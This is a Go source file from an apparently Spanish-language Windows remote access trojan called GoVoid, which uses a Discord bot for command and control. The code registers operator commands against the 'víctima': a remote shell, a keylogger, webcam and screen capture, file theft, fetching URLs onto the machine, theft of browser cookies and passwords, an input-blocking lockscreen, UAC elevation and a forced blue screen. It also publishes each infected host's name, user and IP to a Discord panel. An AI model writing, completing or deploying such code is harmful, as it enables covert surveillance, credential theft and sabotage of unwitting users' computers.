//go:build windows

package bot

import (
	"encoding/base64"
	"fmt"
	"log/slog"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/ui"
)

func registerCommands(s *discordgo.Session) error {
	commandList := []*discordgo.ApplicationCommand{
		{
			Name:        "shell",
			Description: "Ejecuta un comando en cmd.exe",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "cmd",
					Description: "Comando a ejecutar",
					Required:    true,
				},
			},
		},
		{
			Name:        "screenshot",
			Description: "Captura el escritorio de la víctima",
		},
		{
			Name:        "keylog",
			Description: "Controla el keylogger",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "action",
					Description: "Acción del keylogger",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "start", Value: "start"},
						{Name: "stop", Value: "stop"},
						{Name: "dump", Value: "dump"},
					},
				},
			},
		},
		{
			Name:        "sysinfo",
			Description: "Información del sistema",
		},
		{
			Name:        "ps",
			Description: "Lista o mata procesos",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "action",
					Description: "list o kill",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "list", Value: "list"},
						{Name: "kill", Value: "kill"},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "pid",
					Description: "PID a matar (solo con action=kill)",
					Required:    false,
				},
			},
		},
		{
			Name:        "download",
			Description: "Envía un archivo de la víctima al operador",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Ruta del archivo o directorio",
					Required:    true,
				},
			},
		},
		{
			Name:        "upload",
			Description: "Descarga una URL en la víctima",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "url",
					Description: "URL a descargar",
					Required:    true,
				},
			},
		},
		{
			Name:        "clip",
			Description: "Lee o escribe el portapapeles",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "action",
					Description: "get o set",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "get", Value: "get"},
						{Name: "set", Value: "set"},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "text",
					Description: "Texto a escribir (solo con action=set)",
					Required:    false,
				},
			},
		},
		{
			Name:        "msgbox",
			Description: "Muestra un MessageBox en la víctima",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "title",
					Description: "Título de la ventana",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "text",
					Description: "Texto del mensaje",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "icon",
					Description: "Icono del mensaje",
					Required:    false,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "info", Value: "info"},
						{Name: "warn", Value: "warn"},
						{Name: "error", Value: "error"},
					},
				},
			},
		},
		{
			Name:        "webcam",
			Description: "Captura un frame de la webcam",
		},
		{
			Name:        "passwords",
			Description: "Extrae cookies y contraseñas de Chrome, Edge y Brave con su URL",
		},
		{
			Name:        "lockscreen",
			Description: "Cortina negra permanente con teclado y ratón bloqueados",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "action",
					Description: "on, off o status",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{Name: "on", Value: "on"},
						{Name: "off", Value: "off"},
						{Name: "status", Value: "status"},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "minutes",
					Description: "Minutos hasta liberarse sola. Vacío = permanente",
					Required:    false,
				},
			},
		},
		{
			Name:        "kill",
			Description: "Apaga el agente (reaparece al reiniciar)",
		},
		{
			Name:        "elevate",
			Description: "Pide UAC y relanza el agente como administrador",
		},
		{
			Name:        "bsod",
			Description: "Provoca una pantalla azul matando un proceso crítico",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionBoolean,
					Name:        "diagnostico",
					Description: "Solo comprueba el bugcheck, sin provocarlo",
					Required:    false,
				},
			},
		},
		{
			Name:        "shutdown",
			Description: "Apaga el agente y limpia toda la persistencia",
		},
	}

	appID := applicationID(s)
	if appID == "" {
		return fmt.Errorf("register: la sesión no tiene id de aplicación todavía")
	}

	// Si la lista viva ya coincide, no se vuelve a publicar. Cada reinicio
	// reescribía los 16 comandos y eso gasta el cupo diario de Discord; cuando
	// se agota, el registro falla y el menú deja de actualizarse.
	if current, listErr := s.ApplicationCommands(appID, config.GuildID); listErr == nil && sameCommandSet(current, commandList) {
		slog.Info("register: comandos sin cambios", "total", len(current))
		return nil
	}

	// Los comandos de guild aparecen al instante en el menú; los globales
	// tardan hasta una hora. Se registran en la guild y, si esa llamada falla
	// (por ejemplo, un token sin el scope applications.commands en esa guild),
	// se cae a global para que el menú salga igualmente.
	_, err := s.ApplicationCommandBulkOverwrite(appID, config.GuildID, commandList)
	if err != nil && config.GuildID != "" {
		slog.Warn("register: guild falló, se intenta global", "err", err)
		_, err = s.ApplicationCommandBulkOverwrite(appID, "", commandList)
	}
	if err != nil {
		return fmt.Errorf("register: bulk overwrite: %w", err)
	}

	// Verificación explícita: si Discord acepta la llamada pero el cliente no
	// muestra nada, aquí queda el número real de comandos vivos.
	published, listErr := s.ApplicationCommands(appID, config.GuildID)
	if listErr != nil {
		slog.Warn("register: no se pudo releer la lista", "err", listErr)
		return nil
	}
	slog.Info("register: comandos publicados", "total", len(published), "guild", config.GuildID)
	return nil
}

// sameCommandSet compara solo los nombres: Discord genera ids nuevos en cada
// sobrescritura, así que comparar objetos completos siempre daría distinto.
func sameCommandSet(live []*discordgo.ApplicationCommand, wanted []*discordgo.ApplicationCommand) bool {
	if len(live) != len(wanted) {
		return false
	}
	seen := make(map[string]struct{}, len(live))
	for _, command := range live {
		seen[command.Name] = struct{}{}
	}
	for _, command := range wanted {
		if _, ok := seen[command.Name]; !ok {
			return false
		}
	}
	return true
}

// applicationID saca el id de la aplicación del propio token (primera parte,
// en base64). Sin esto, una reconexión deja s.State.User.ID a veces vacío y
// la llamada de registro apunta a /applications//commands y falla en silencio.
func applicationID(s *discordgo.Session) string {
	if s.State != nil && s.State.User != nil && s.State.User.ID != "" {
		return s.State.User.ID
	}
	parts := strings.SplitN(config.BotToken, ".", 2)
	if len(parts) == 0 {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return ""
	}
	if _, err := strconv.ParseUint(string(raw), 10, 64); err != nil {
		return ""
	}
	return string(raw)
}

// panelMsgID recuerda el último panel publicado para poder corregir la IP
// cuando la resolución en segundo plano termina. Sin esto el panel se queda
// con "desconocida" aunque la IP ya se conozca.
var (
	panelMu      sync.Mutex
	panelMsgID   string
	panelChannel string
)

func sendPanel(s *discordgo.Session, session *Session) error {
	rendered := snapshotSession(session)
	msg, err := s.ChannelMessageSendComplex(rendered.ChannelID, &discordgo.MessageSend{
		Embeds:     []*discordgo.MessageEmbed{panelEmbed(&rendered)},
		Components: ui.ControlPanel(),
	})
	if err != nil {
		return fmt.Errorf("register: panel: %w", err)
	}

	panelMu.Lock()
	panelMsgID = msg.ID
	panelChannel = rendered.ChannelID
	panelMu.Unlock()

	// La IP puede llegar mientras el mensaje viaja. Si el panel salió con
	// "desconocida" y ya hay IP, se corrige aquí: la corrección de
	// resolveCachedIP pudo ejecutarse antes de que existiera el mensaje.
	if latest := snapshotSession(session); latest.IP != rendered.IP {
		updatePanelIP(s, session)
	}
	return nil
}

func panelEmbed(session *Session) *discordgo.MessageEmbed {
	return &discordgo.MessageEmbed{
		Title: "🟢 GoVoid — sesión activa",
		Color: 3066993,
		Fields: []*discordgo.MessageEmbedField{
			{Name: "Hostname", Value: session.Hostname, Inline: true},
			{Name: "Usuario", Value: session.Username, Inline: true},
			{Name: "IP", Value: session.IP, Inline: true},
			{Name: "Sesión", Value: fmt.Sprintf("sesion-%d", session.SessionNum), Inline: true},
			{Name: "UUID", Value: session.ID, Inline: true},
			{Name: "Conectado", Value: session.ConnectedAt.UTC().Format(time.RFC3339), Inline: false},
		},
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

// updatePanelIP corrige la IP del panel ya publicado. La sesión se crea antes
// de resolver la IP para no retrasar el arranque; cuando llega, se pinta aquí.
func updatePanelIP(s *discordgo.Session, session *Session) {
	panelMu.Lock()
	msgID, channelID := panelMsgID, panelChannel
	panelMu.Unlock()
	if msgID == "" || channelID == "" {
		return
	}
	latest := snapshotSession(session)
	if _, err := channelEditMessageBounded(s, channelID, msgID, &discordgo.MessageEdit{
		ID:      msgID,
		Channel: channelID,
		Embeds:  []*discordgo.MessageEmbed{panelEmbed(&latest)},
	}, 20*time.Second); err != nil {
		slog.Debug("bot: no se pudo corregir la IP del panel", "err", err)
	}
}
